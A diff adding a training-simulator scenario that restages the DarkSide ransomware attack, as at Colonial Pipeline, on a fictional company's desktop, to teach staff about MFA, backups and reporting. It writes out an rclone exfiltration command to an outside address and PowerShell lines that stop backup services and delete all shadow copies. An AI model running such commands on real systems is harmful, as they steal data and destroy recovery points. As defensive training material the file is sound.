@@ -1,0 +1,357 @@
+# DarkSide (Colonial Pipeline, May 2021). Human-operated ransomware: the attackers came in with a leaked VPN password.
+# A quest (QUESTS.md): the trainee is IT support doing the weekly check of remote-access accounts. The real victims' staff saw
+# nothing arrive; the nearest desk-side view is the quiet hole the attackers used, then the slow PC, the failed backup and the note.
+os windows
+user Dana Okafor
+about
+  | DarkSide did not arrive in an email. Attackers signed in to the company's remote access with one old password that had leaked, with no second check.
+  | They copied the data out first, deleted the backups, then locked the files and threatened to publish what they took. Colonial Pipeline shut down its fuel pipeline while it recovered. The victim here, Northwind Traders, is made up.
+story
+  | You are Dana Okafor, IT assistant at Northwind Traders, a small food wholesaler. Every week you check the accounts that can sign in to the company's systems from outside, and decide for each: keep or disable.
+  | It is Thursday afternoon. You have closed 8 of this week's 10 security jobs. Two to go.
+  | Your admin sign-in is in a text file on the desktop. That is a bad habit, but it keeps this training quick.
+quota 8 10 Security jobs closed this week
+
+# Dana's desk: the details she copies from (soft flags: careless, but only here to keep the training simple).
+file Desktop/admin-login.txt
+  at 930 200
+  | Northwind Remote Access: admin console
+  | User ID: dana.okafor
+  | Password: Harbour-Gate-2026!
+  | Phone code today (training copy): 482913
+file Desktop/service-accounts.txt
+  at 930 300
+  | Service accounts (old list, do not share)
+  | svc-legacy: Scanner-2019-Old
+  | svc-backup: Vault-Keeper-77
+
+# The admin console: a sign-in with a password AND a phone code, and the weekly check behind it.
+page admin-signin remote-admin.northwind.example/sign-in
+  title Northwind Remote Access: admin sign-in
+  brand Northwind Remote Access
+  favorite
+  heading Sign in to the admin console
+  | Enter your password, then the code from your phone.
+  field User ID = dana.okafor
+  field secret Password = Harbour-Gate-2026!
+  field Code from your phone = 482913
+  button Sign in
+page kept-9 remote-admin.northwind.example/accounts/priya.shah/kept
+  title Account kept: priya.shah
+  brand Northwind Remote Access
+  heading Account kept
+  | priya.shah stays on the list. Next check: in a week.
+page disabled-9 remote-admin.northwind.example/accounts/priya.shah/disabled
+  title Account disabled: priya.shah
+  brand Northwind Remote Access
+  heading Account disabled
+  | priya.shah can no longer sign in from outside. Accounts will be asked if that was meant.
+page review-9 remote-admin.northwind.example/accounts/priya.shah
+  title Weekly check: priya.shah
+  brand Northwind Remote Access
+  requires admin-signin
+  heading Weekly check: priya.shah
+  | Account 9 of 10 on this week's list. Check that it is still needed and still protected.
+  section This account
+  row Name = Priya Shah, Accounts
+  row Last sign-in = Wednesday 4 November, 08:55, from 192.0.2.42
+  row Second check = Phone prompt on every sign-in
+  row Password changed = 12 October 2026
+  section Still to check
+  columns Account | Last sign-in | Second check
+  cells svc-legacy | 2 years ago | none
+  note Marcus Lee asked to leave svc-legacy alone until the warehouse scanner vendor replies.
+  button Keep: Priya still needs it -> kept-9
+  button Disable this account -> disabled-9
+
+mail access-9
+  from Access Review <access-review@northwind.example>
+  subject Weekly check 9 of 10: priya.shah
+  sent 2026-11-05 16:41
+  link review-9
+  | Hi Dana,
+  |
+  | The next account on this week's list is priya.shah (Accounts). The link opens it in the admin console.
+  |
+  | Northwind IT
+
+step Job 9 of 10
+  look Mail: the weekly check message
+  | A new account has come up on your list. This one is an ordinary one. Do it the normal way first, so you know what normal looks like.
+  | One thing to remember from this check: how people sign in, and who is still on the list.
+notify mail Access Review
+  | Weekly check 9 of 10: priya.shah
+
+step The link goes to our own console
+  look the link under the message
+  when mail access-9
+  | The email links to Northwind's own address, northwind.example. Hover over a link before you click it, to check where it goes.
+open access-9
+
+step Password, then a phone code
+  look the three boxes: User ID, Password and a code from your phone
+  when visit review-9
+  move Copy the details from admin-login.txt on the desktop: click a box and press any keys to type, then click “Sign in”.
+  | The console asks for a password and then a code from your phone. Two checks, not one. Remember this page: it is what a protected account looks like.
+open review-9
+
+step Check the account
+  look the details: second check, last sign-in, and the list below
+  when choose admin-signin 1
+  | You are in. This account signed in yesterday morning from the office, with a phone prompt. It is needed and protected, so keep it.
+  | Look at the list below, too: it shows the one account left to check.
+signin admin-signin
+
+step 9 of 10 done
+  look the counter in the guide: one job left
+  when choose review-9 any
+  | Done. The last account on the list is svc-legacy. It has not been used for two years, but Marcus asked you to leave it until the scanner vendor replies. So it waits, and you go home.
+choose review-9 1
+quota +1
+
+# Friday morning. The attackers came in at 02:14 and nobody saw it. The overnight report is the log a defender can read.
+program rclone rclone
+  publisher none
+  signed no
+  description File copy tool
+  process rclone.exe
+  cpu 37
+  mem 120
+  parent cmd.exe
+  command C:\ProgramData\rclone.exe copy \\FS01\Share remote:upload
+  net 203.0.113.30:443 (upload)
+page signin-log remote-admin.northwind.example/reports/overnight
+  title Overnight sign-in report
+  brand Northwind Remote Access
+  heading Overnight sign-in report: Thursday 22:00 to Friday 06:00
+  | Sign-ins from outside the office, overnight.
+  section Sign-in at 02:14
+  row Account = svc-legacy (last used 2 years ago)
+  row Signed in from = 203.0.113.77, not a Northwind address
+  row Time = 02:14, when nobody is working
+  row Second check = None: password only
+  row Password found in a public leak = Yes
+  section All sign-ins overnight
+  columns Account | From | Second check
+  cells marcus.lee | 192.0.2.41 | Phone prompt
+  cells svc-legacy | 203.0.113.77 | none
+mail overnight-report
+  from Access Review <access-review@northwind.example>
+  subject Overnight sign-in report (Friday 06:00)
+  sent 2026-11-06 06:00
+  link signin-log
+  | Hi Dana,
+  |
+  | The overnight report from the remote-access system is ready. The link opens it.
+  |
+  | Northwind IT
+notify mail Access Review
+  | Overnight sign-in report (Friday 06:00)
+
+step Friday, 6:50
+  look Mail: the overnight sign-in report
+  when mail overnight-report
+  | You are early. The overnight report has come in, and your PC feels slow. Start with the report.
+open overnight-report
+
+step One account, one password
+  look the report: svc-legacy at 02:14, from outside, with no second check
+  when visit signin-log
+  | It is the account you left for Marcus. Someone signed in with its old password, which had leaked, and nothing else was asked. A phone code would have stopped them.
+  | One forgotten account without a second check was the whole way in. Someone has been on the network for hours, and your PC has been slow since you sat down.
+launch rclone
+open signin-log
+mail priya-files
+  from Priya Shah <priya.shah@northwind.example>
+  subject The Share has been crawling
+  sent 2026-11-06 06:58
+  | Dana,
+  |
+  | The Share has been very slow since I got in, and my budget file takes ages to open. Is IT doing something to the server?
+  |
+  | Priya
+notify mail Priya Shah
+  | The Share has been crawling
+
+step Your PC is slow
+  look Mail: Priya's message about the Share
+  when mail priya-files
+  | Priya says the Share has been crawling since she got in. Your PC is slow too.
+  | Something on this PC is busy. Find out what.
+open priya-files
+
+step rclone is copying the data out
+  look {Task Manager|Activity Monitor}: rclone.exe, using a lot of the processor
+  when open taskmanager
+  | rclone is an ordinary, free file-copying tool. The attackers use it to send the company's files to their own server: about 100 GB, copied out before the lock.
+  | This is why they can threaten to publish: good backups cannot take stolen data back.
+open taskmanager
+mail backup-alert
+  from Backup Monitor <backup-monitor@northwind.example>
+  subject Backup job FAILED: FS01, no restore points found
+  sent 2026-11-06 07:12
+  | The nightly backup did not run on FS01.
+  |
+  | The Backup Agent service stopped at 04:40, and no restore points were found for the Share.
+  |
+  | Backup Monitor
+notify mail Backup Monitor
+  | Backup job FAILED: FS01, no restore points found
+
+# The monitoring alert, and the console the attackers kept hidden.
+view darkside-prep console
+  title Windows PowerShell
+  app Windows PowerShell
+  size 470x230
+  line PS C:\> Get-Service | Where-Object Name -match "sql|backup|veeam" | Stop-Service -Force
+  line Stopping service: SQL Server (MSSQLSERVER) ... done
+  line Stopping service: Backup Agent ... done
+  line PS C:\> Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }
+  line Deleted shadow copy 1 of 4 ... 4 of 4
+  line PS C:\> # restore points and backups are gone
+  line (Illustration for training: nothing was run.)
+  button Show what ran next -> done primary
+
+step The backups are gone
+  look Mail: the backup alert, and the PowerShell window that opens
+  when mail backup-alert
+  | Before locking anything, the attackers stopped the backup and database services and deleted every restore point.
+  | The real PowerShell window was hidden; this one is an illustration.
+  | Without backups, a company has little choice. This is why they do it first.
+open backup-alert
+show darkside-prep
+
+# The encryptor: a random file name, pushed to many computers at once by the attackers. No prompt, no window.
+program darkside-enc a8f3c1d2
+  publisher none
+  signed no
+  description Unknown program
+  process a8f3c1d2.exe
+  cpu 100
+  mem 210
+  parent services.exe
+  command C:\Windows\Temp\a8f3c1d2.exe -path C:\Users\dana
+
+# IT's report form: the safe copy of the leak site, and the one button that reports this PC. No criminal page has a report button.
+page incident-sent it-help.northwind.example/incident/sent
+  title Incident reported
+  brand Northwind IT
+  heading Reported to IT
+  | Reported at 07:41. IT is cutting this PC and the Share off the network and calling the response team and the police.
+  | Do not pay, do not wipe or restart the PC, and do not open the link in the note.
+page it-report it-help.northwind.example/report
+  title Report a ransom note
+  brand Northwind IT
+  heading Report to IT
+  | If this PC shows a ransom note, report it now. Do not pay, and do not open the link in the note.
+  section Safe copy of the attackers' leak page (training copy)
+  row Company = Northwind Traders
+  row Data copied = 100 GB
+  row Content = company documents, staff records
+  timer Files will be published in = 172800
+  note Training copy: no payment or publishing happens.
+  button Report this PC to IT -> incident-sent
+
+step Every file ends in .7e8f2a1c
+  look Documents: every file ends in .7e8f2a1c, with a padlock. {Task Manager|Activity Monitor}: a8f3c1d2.exe at 100% CPU
+  when done darkside-prep
+  | The encryptor runs on many computers at once. Every file gets a new ending, the same eight characters for this victim. Opening one only says it cannot be opened.
+  | A note called README is in every folder it locked. It says the data is stolen and will be published if the company does not pay.
+launch darkside-enc
+encrypt Documents .7e8f2a1c
+encrypt Pictures .7e8f2a1c
+encrypt Desktop .7e8f2a1c
+file Desktop/README.7e8f2a1c.TXT
+  at 930 400
+  | Welcome to DarkSide.
+  |
+  | Your computers and servers are encrypted, backups are deleted, and we downloaded your private data.
+  | If you do not pay, the data will be published on our leak site.
+  | To get the decryptor, open the private page on the link below (a made-up address) with your personal key.
+  |
+  | http://darkside-payments.invalid  Key: 7e8f2a1c (training copy)
+  |
+  | (Fictional training copy. Nothing on this desktop is real.)
+file Documents/README.7e8f2a1c.TXT
+  | Welcome to DarkSide. Your computers and servers are encrypted, and we downloaded your private data.
+  | (Fictional training copy. Nothing on this desktop is real.)
+file Pictures/README.7e8f2a1c.TXT
+  | Welcome to DarkSide. Your computers and servers are encrypted, and we downloaded your private data.
+  | (Fictional training copy. Nothing on this desktop is real.)
+open Documents
+mail it-leak
+  from Northwind IT <servicedesk@northwind.example>
+  subject Do not pay or open the link in the note
+  sent 2026-11-06 07:35
+  link it-report
+  | All,
+  |
+  | Several PCs show a ransom note. Do not pay, and do not use the link in the note itself.
+  |
+  | Our monitoring service has a safe copy of the attackers' page on the report form that the link opens. If you see the note, report it to IT now.
+  |
+  | Northwind IT
+notify mail Northwind IT
+  | Do not pay or open the link in the note
+
+step The threat to publish
+  look the safe copy on IT's report form: a company card and a countdown
+  when visit it-report
+  | If a company does not pay, the attackers publish its name and files on a leak page. This is why restoring from backup is not enough.
+  | The copy on IT's form shows what they threaten. Do not look for the real page.
+open it-report
+
+step Report it, do not pay
+  look the counter in the guide: the 10th job is the report
+  when choose it-report any
+  | Reporting it to IT at once is the right move. Do not pay, do not restart the PC and do not look for the attackers.
+  | That is job 10 of 10. IT takes it from here, but the files and backups are still gone.
+choose it-report 1
+quota +1
+
+step What DarkSide took
+  look the animation: everything the attackers took and locked
+  | The attackers had been inside for about a week before the lock. This desk squeezes it into one night.
+  | Colonial Pipeline shut down its fuel pipeline for nearly a week and paid about 75 bitcoin the same week; the FBI later recovered part of it.
+  | The old password never needed to be guessed: it was already public. A second check on that one account would have stopped the whole attack.
+open Desktop/README.7e8f2a1c.TXT
+attack ransomware-encrypt
+  | Q3-report.docx
+  | budget.xlsx
+  | notes.txt
+  | todo.txt
+  | backups deleted
+  | 100 GB copied out first
+
+flag hard section signin-log 1
+  label The 02:14 sign-in: leaked password, no second check
+  | A sign-in at 02:14 from outside, with a leaked password and no second check. The report is the only warning there is.
+flag hard process rclone.exe
+  label rclone.exe, a copy tool sending data out
+  | An ordinary file-copying tool, sending the company's data to the attackers' server.
+flag hard process a8f3c1d2.exe
+  label a8f3c1d2.exe, the encryptor
+  | A program with a random eight-character name, no publisher, and all the processor.
+flag hard mail backup-alert
+  label The backup alert: services stopped, no restore points
+  | A backup that fails with no restore points means someone stopped the backup service and deleted the copies on purpose.
+flag hard file Documents/Q3-report.docx.7e8f2a1c
+  label A locked file: new ending and a padlock
+  | The new ending and the padlock mean the file is locked. It cannot be opened.
+flag hard file Documents/README.7e8f2a1c.TXT
+  label README.7e8f2a1c.TXT, the ransom note
+  | The ransom note: the data is stolen, and it will be published if the company does not pay.
+flag hard section it-report 1
+  label The threat to publish, on IT's report form
+  | The threat to publish. Restoring from backup does not take the stolen data back.
+flag soft file Desktop/admin-login.txt.7e8f2a1c
+  label admin-login.txt: the admin password
+  | An admin password in a text file on the desktop. A one-time code in a file is no second check at all.
+flag soft file Desktop/service-accounts.txt.7e8f2a1c
+  label service-accounts.txt: old service passwords
+  | Old service passwords in a text file: any program that runs can read them. svc-legacy is the very account the attackers used.
+
+lesson
+  | Remove accounts that are no longer used, and protect every remote-access account with a second check such as a phone prompt.
+  | Keep offline backups the attackers cannot reach, and report an unexpected sign-in or a failed backup at once: it can be the first and last warning.
+  | Do not pay, and do not restart or wipe the PC: call IT and the police first.
